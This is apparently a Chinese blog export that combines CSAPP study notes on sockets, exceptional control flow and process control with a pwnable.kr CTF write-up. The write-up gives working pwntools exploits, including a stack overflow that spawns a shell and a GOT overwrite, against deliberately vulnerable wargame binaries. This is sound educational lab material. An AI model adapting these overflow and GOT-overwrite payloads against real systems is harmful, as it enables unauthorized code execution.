<p>如果想要使套接字称为连接的一个端点，就用如下硬编码的参数来调用socke函数：<br><code>clientfd = Socket(AF_INMET, SOCKET_STREAM, 0);</code><br>socket返回的clientfd描述符仅是部分打开的，还不能读写。如何完成打开套接字的工作，取决于我们是客户端还是服务器。</p>
<h2 id="connect函数"><a href="#connect函数" class="headerlink" title="connect函数"></a>connect函数</h2><p>客户端通过调用connect函数来建立和服务器的连接。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> clientfd, <span class="keyword">const</span> struct sockadrr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line">                            <span class="comment">//返回：若成功为0，出错为-1；</span></span><br></pre></td></tr></table></figure>

<p>connect函数试图与套接字地址为addr的服务器建立一个因特网连接，其中addrlen是sizeof(sockaddr_in)。connect函数会阻塞，一直到成功连接或是发生错误。</p>
<h2 id="bind函数"><a href="#bind函数" class="headerlink" title="bind函数"></a>bind函数</h2><p>剩下的套接字函数————bind、listen和accept，服务器用它们和客户端建立连接。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockefd, <span class="keyword">const</span> struct sockaddr *addr,</span></span></span><br><span class="line"><span class="function"><span class="params">        <span class="keyword">socklen_t</span> addrlen)</span></span>;</span><br><span class="line">                <span class="comment">//返回：成功返回0， 错误返回-1。</span></span><br></pre></td></tr></table></figure>

<p>bind函数告诉内核将addr中的服务器套接字地址和套接字描述符sockfd联系起来。</p>
<h2 id="listen函数"><a href="#listen函数" class="headerlink" title="listen函数"></a>listen函数</h2><p>客户端时发起连接请求的主动实体。服务器是等待来自客户端的连接请求的被动实体。默认情况下，内核会认为socket函数创建的描述符对应于<strong>主动套接字(active socket)</strong>，默认情况下，它存在于一个连接的客户端。服务器调用listen函数告诉内核，描述符是被服务器使用的，而不是客户端使用的。</p>
<h2 id="accept函数"><a href="#accept函数" class="headerlink" title="accept函数"></a>accept函数</h2><p>服务器通过调用accept函数等待来自客户端的连接请求。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> listenfd, struct sockaddr *addr, <span class="keyword">int</span> *addrlen)</span></span>;</span><br><span class="line">                <span class="comment">//若成功则返回非负连接描述符，若出错则为-1</span></span><br></pre></td></tr></table></figure>

<p>accept函数等待来自客户端的连接请求到达侦听描述符listenfd，然后在addr中填写客户端的套接字地址，并返回一个**已连接描述符(connected descriptor)，这个描述符可被来利用Unix I/O函数与客户端通信。</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
  </entry>
  <entry>
    <title>异常控制流</title>
    <url>/year/07/09/cl7iordqf0052293fcjkhdi9f/</url>
    <content><![CDATA[<p>现代系统通过使控制流发生突变来对这些情况做出反应。一般而言，我们把这些突变称为异常控制流(Exceptional Control Flow, ECF)。<br>作为程序员，理解EFC很重要，这有很多原因:</p>
<ul>
<li>理解EFC将帮助你理解重要的系统概念</li>
<li>理解EFC将帮助你理解应用程序时如何与操作系统交互的</li>
<li>理解EFC将帮助你编写有趣的新应用程序</li>
<li>理解EFC将帮助你理解并发</li>
<li>理解EFC将帮助你理解软件异常如何工作<a id="more"></a>
<h1 id="8-1异常"><a href="#8-1异常" class="headerlink" title="8.1异常"></a>8.1异常</h1></li>
<li><em>异常(exception)*</em> 就是控制流中的突变，用来相应处理器状态中的某种变化。在处理器中，状态被编码为不同的位和信号。状态变化称为<strong>事件(event)</strong><br><img src="https://img-blog.csdn.net/20161128103126532" alt="异常的剖析"><br>在任何情况下，当处理器检测到有事件发生时，他就会通过一张叫做<strong>异常表(exception table)</strong> 的跳转表，进行一个间接过程调用(异常)，到一个专门设计用来处理这类事件的操作系统子程序(异常处理程序(exception handler))。当异常处理程序完成处理后，根据引起异常的事件的类型，将会发生以下3种情况的一种：</li>
</ul>
<ol>
<li>处理程序将控制返回给当前指令Icuur，即当前事件发生时正在执行的指令。</li>
<li>处理程序将控制返回给Inext，如果没有发生异常将会执行的下一条指令。</li>
<li>处理程序终止被中断的程序。<h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2>在运行时(当系统执行某个程序时)，处理器检测到发生了一个事件，并且确定了相对的异常号k。随后，处理器触发异常，方法是执行间接过程调用，通过异常表的表目k，转到相应的处理程序。<br><img src="https://img-blog.csdn.net/20161128103239915" alt="异常表"><h2 id="异常的类别"><a href="#异常的类别" class="headerlink" title="异常的类别"></a>异常的类别</h2><img src="https://img-blog.csdn.net/20161128105219886" alt="异常的类别"><br>总结：</li>
<li>中断是异步发生的，是来自处理器外部的I/O设备的信号的结果。</li>
<li>陷阱最重要的用途是在用户程序和内核之间提供一个像过程一样的接口，叫做系统调用。</li>
<li>故障由错误情况引起，它可能能够被故障处理程序修正。</li>
<li>终止是不可恢复的致命错误造成的结果，通常是一些硬件错误。<h2 id="Linux-x86-64-异常与系统调用"><a href="#Linux-x86-64-异常与系统调用" class="headerlink" title="Linux/x86-64 异常与系统调用"></a>Linux/x86-64 异常与系统调用</h2><h3 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h3><img src="https://img-blog.csdn.net/20161128104833181" alt><h3 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h3><img src="https://img-blog.csdn.net/20161128104917671" alt><br>在x86-64系统上，系统调用是通过一条称为syscall的陷阱指令提供的，其参数通过寄存器来传递。<br>例如一个hello world<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">"hello, world\n"</span>,<span class="number">13</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>下面是汇编版本,直接使用syscall指令来调用write和exit系统调用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">main:</span><br><span class="line">    //First call write(1, &quot;hello, world\n&quot;,13);</span><br><span class="line">    movq $1, %rax            //write is system call 1</span><br><span class="line">    movq $1, %rdi            //Arg1: stdout has descriptor 1</span><br><span class="line">    movq $string, %rsi      //Arg2: hello, world string</span><br><span class="line">    movq &amp;len, %rdx         //Arg3: string length</span><br><span class="line">    syscall                 //Make the system call</span><br><span class="line"></span><br><span class="line">    //Next, call _exit(0)</span><br><span class="line">    movq $60, %rax          //exit is system call 60</span><br><span class="line">    movq &amp;0, %rdi           //Arg1: exit status is 0</span><br><span class="line">    syscall                 //Make the system call</span><br></pre></td></tr></table></figure>

<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>进程的经典定义就是<strong>一个执行中程序的实例</strong>。系统中每个程序都运行在某个进程的上<strong>下文中(context)</strong>。上下文是由程序正确运行所需的状态组成的。这个状态包括存放在内存中的代码和数据，它的栈、通用目的寄存器的内容、程序计数器、环境变量以及打开文件描述符的集合。</p>
<p>每次用户通过向shell输入一个可执行目标文件的名字，运行程序时shell就会创建一个新的进程，然后在这个新进程的上下文中运行这个可执行目标文件。应用程序也能够创建新进程，然后在这个新进程的上下文中运行它们自己的代码或者其它的应用程序。</p>
<p>进程提供给应用程序的关键抽象：</p>
<ul>
<li>一个独立的逻辑控制流，它提供一个假象，好像我们的程序独占的使用处理器。</li>
<li>一个私有的地址空间，他提供一个假象，好像我们的程序独占地使用内存系统。<h3 id="进程控制"><a href="#进程控制" class="headerlink" title="进程控制"></a>进程控制</h3><h4 id="获取进程-ID"><a href="#获取进程-ID" class="headerlink" title="获取进程 ID"></a>获取进程 ID</h4>每个进程都有一个唯一的正数(非零)进程 ID(PID)。getpid函数返回调用进程的 PID。getppid函数返回它的父进程的PID(创建调用进程的进程)。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span>  <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<h4 id="创建和终止进程"><a href="#创建和终止进程" class="headerlink" title="创建和终止进程"></a>创建和终止进程</h4><p><strong>父进程</strong>通过调用fork函数创建一个新的运行的<strong>子进程</strong>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line">                    返回：子进程返回<span class="number">0</span>，父进程返回子进程的PID，如果出错则为<span class="number">-1</span></span><br></pre></td></tr></table></figure>

<p>父进程和子进程之间最大的区别在于它们有不同的PID。</p>
<p>一个使用fork创建子进程的父进程的示例。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pid_t</span> pid;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    pid = Fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"child : x=%d\n"</span>, ++x);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*Parent */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"parent: x=%d\n"</span>, --x);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当在Unix系统上运行这个程序时，我们得到下面结果：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">linux&gt; ./fork</span><br><span class="line">parent: x=0</span><br><span class="line">child: x=2</span><br></pre></td></tr></table></figure>

<p>这说明了fork：</p>
<ul>
<li><strong>调用一次返回两次</strong>。fork函数被父进程调用一次，但是却返回两次——一次是返回到父进程，一次是返回到新创建的子进程。</li>
<li><strong>并发执行</strong>。父进程和子进程是并发运行的独立进程。内核能够以任意方式交替执行它们的逻辑控制流中的指令。在我们的系统上运行这个程序时，父进程先完成它的printf语句，然后是子进程。然而，在另一个系统上可能正好相反。</li>
<li><strong>相同但是独立的地址空间</strong>。父进程和子进程对x所做的任何改变都是独立的，不会反应在另一个进程的内存中。这就是为什么当父进程和子进程调用他们各自的printf语句时，它们中的变量x会有不同的值。</li>
<li><strong>共享文件</strong><h2 id="加载并运行程序"><a href="#加载并运行程序" class="headerlink" title="加载并运行程序"></a>加载并运行程序</h2>execv函数在当前进程的上下文中加载并运行一个程序。<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execcve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *argv[],</span></span></span><br><span class="line"><span class="function"><span class="params">            <span class="keyword">const</span> <span class="keyword">char</span> *envp[])</span></span>;</span><br><span class="line">                                 如果成功，则不返回，如果错误则返回<span class="number">-1</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>argv变量指向一个以null结尾的指针数组，其中每个指针都指向一个参数字符串。envp变量指向一个以null结尾的指针数组，其中每个指针指向一个环境变量字符串，每个串都是形如”name=value”的名字-值对。</p>
<p>进程是执行中程序的一个具体的实例；程序总是运行在某个进程的上下文中。fork函数在新的子进程中运行相同的程序，新的子进程是父进程的一个复制品。execve函数在当前进程的上下文中加载并运行一个新的程序。它会覆盖当前进程的地址空间，但没有创建一个新的进程。新的程序仍然有相同的pid，并且继承调用execve函数时已打开的所有文件描述符。</p>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
  </entry>
  <entry>
    <title>pwnable.kr第一部分writeup</title>
    <url>/year/07/06/cl7iordpp0034293fc0eq1og2/</url>
    <content><![CDATA[<p>pwnable.kr上的题相对而言还是比较友好的，最近刷一下上面第一部分的题查漏补缺吧</p>
<a id="more"></a>

<h2 id="fod"><a href="#fod" class="headerlink" title="fod"></a>fod</h2><hr>
<p>思路：1.先查看源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"pass argv[1] a number\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">	<span class="keyword">int</span> len = <span class="number">0</span>;</span><br><span class="line">	len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">"LETMEWIN\n"</span>, buf))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"good job :)\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"learn about Linux file IO\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.只要我们能够执行system(‘/bin/cat flag’)函数，我们就可以查看到falg里面的内容，所以我们要找到可以执行system函数的条件，也就是buf里面的内容是”LETMEWIN\n”。接下来的任务就是找buf何来。</p>
<p>read()中从fd文件符读32字节，fd即为文件操作符，只有当fd=0时我们才能通过输入控制，所以使argv[1]=’0x1234’ 即可。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                              </span><br><span class="line">s=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'fd'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">p=s.process(argv=[<span class="string">'./fd'</span>,<span class="string">'4660'</span>],executable=<span class="string">'./fd'</span>)</span><br><span class="line">p.sendline(<span class="string">'LETMEWIN'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="collison"><a href="#collison" class="headerlink" title="collison"></a>collison</h2><hr>
<p>思路：<br>1.有源码先看源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">		res += ip[i];</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.先看代码结构：有两个函数，main()和check_password()，先看main()找到关于flag的语句，当hashcode等于将第二个参数传入check_password后的返回值时，拿到flag，hashcode已给出，分析check_password()即可，<br>​ int* ip = (int*)p; 此句为理解关键，将char类型指针强转为int型，ip每加一移动4个字节，所以题意为将输入的20个字节的参数分为5组，累加后等于0x21dd09ec即可<br>3.计算器：0x01010101 * 4 +0x1dd905e8 = 0x21dd09ec （看网上说有坏字符的影响，但这么多数，随便选一个也可以了吧。。。。）</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                           </span><br><span class="line">s=ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'col'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">str=p32(<span class="number">0x01010101</span>)*<span class="number">4</span> + p32(<span class="number">0x1dd905e8</span>)</span><br><span class="line">p=s.process(argv=[<span class="string">'./col'</span>,str],executable=<span class="string">'./col'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h2><hr>
<p>思路：<br>1.有源码先看源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.看到有system函数，并且还有一个gets函数。于是可以利用这个gets函数对输入长度不加限制的条件将key的值覆盖为0xcafebabe。<br>3.详细原理参见<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow-basic-zh/" target="_blank" rel="noopener">ctfwif栈溢出基本原理</a></p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *                                                            </span><br><span class="line">s=remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">payload=<span class="string">'A'</span>*<span class="number">0x34</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><hr>
<p>思路：<br>1.没有给源码，只有一个elf文件。拖进IDA后发现函数少的可怜，f5也没法使用（基本是加壳了），再看hex-view发现一句话<br><img src="https://i.loli.net/2018/12/26/5c233dec81b77.png" alt="IDA hex-view"><br>this file is packed with the UPX…….很明显，这题需要upx的知识储备，寻找谷歌百度 ，发现文件被Upx方式加壳，需要解壳。(我实在ubuntu虚拟机上直接安装upx工具后执行upx -d 文件名 命令就可以成功脱壳)</p>
<p>2.之后再把它放进ida中，f5看源码得知他要把flag复制进malloc()里，但是我们可以其实可以直接双击flag直接看注释得知flag…..可能是bug…. 或者在gdb里也可以直接在传递flag给rdx的指令后下个断点，然后在已字符串形式查看rdx的值即可（如下图）</p>
<p><img src="/06/cl7iordpp0034293fc0eq1og2/flag.png" alt="pwngdb调试图"></p>
<h2 id="password"><a href="#password" class="headerlink" title="password"></a>password</h2><hr>
<p>思路：<br>1.有源码先看源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode1 : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter passcode2 : "</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"checking...\n"</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login OK!\n"</span>);</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Login Failed!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"enter you name : "</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%100s"</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Welcome %s!\n"</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Toddler's Secure Login System 1.0 beta.\n"</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Now I can safely trust you that you have credential :)\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.这题有点小难度：（首先应注意到welcome()和login()同在main()里且之间没有多余操作，所以他们ebp应该一样。）第一个思路是直接把system()的地址放进welcome()的ret里，后来发现name虽然限制了为100，但是name偏移了70H，失败。第二个思路是看passcode1和passcode2的地址，通过welcome中的name设计数据来控制他们的值：有两个地方行不通：(1)passcode2与name的偏移大于100 。 (2)passcode1为338150（0x000582E6），passcode2为13371337（0x00cc07c9）即可，然而且不论这两个地址是否是可写的，至少00字节的存在就因为截断而打消念想了。<br>3.这个时候就需要查新的资料和方法了，<a href="http://rickgray.me/2015/08/07/use-gdb-to-study-got-and-plt/" target="_blank" rel="noopener">通过理解plt表和got表</a>诞生了一种新的方法，双重scanf()连续修改，在welcome()的scanf()利用name设计passcode1（需先确定passcode1的地址相对name的偏移）的值，将其值设为fflush()的got表地址，在login()的第一个scanf()向passcode1所指向的地址（Got表中原本写的是调用flush()指令的地址）改为调用system函数指令的地址，所以之后调用fflush()的时候就会调用system（）。</p>
<p>exp:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s=ssh(host=<span class="string">'pwnable.kr'</span>,port=<span class="number">2222</span>,user=<span class="string">'passcode'</span>,password=<span class="string">'guest'</span>)</span><br><span class="line">p=s.process(<span class="string">'./passcode'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>* <span class="number">0x60</span> + <span class="string">'\x04\xa0\x04\x08'</span> + <span class="string">'134514147'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>exp需注意的地方：应数是输入给scanf 有固定格式，不能随便输入，例如%d只能为十进制整数，将134514147换成0x080485e3则不对。</p>
<p>另：<a href="https://r00tk1ts.github.io/2018/03/05/passcode/" target="_blank" rel="noopener">这位大佬的writeup值得一看</a></p>
<h2 id="random"><a href="#random" class="headerlink" title="random"></a>random</h2><hr>
<p>思路：<br>1.先看源码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> random;</span><br><span class="line">	random = rand();	<span class="comment">// random value!</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> key=<span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;key);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>( (key ^ random) == <span class="number">0xdeadbeef</span> )&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Good!\n"</span>);</span><br><span class="line">		system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Wrong, maybe you should try 2^32 cases.\n"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>2.明显看出rand()的种子为固定的，所以其值也为固定的值，自己写一个程序跑一下就可以得出其结果，然后key = random ^ 0xdeadbeef得出结果</p>
<p>exp:</p>
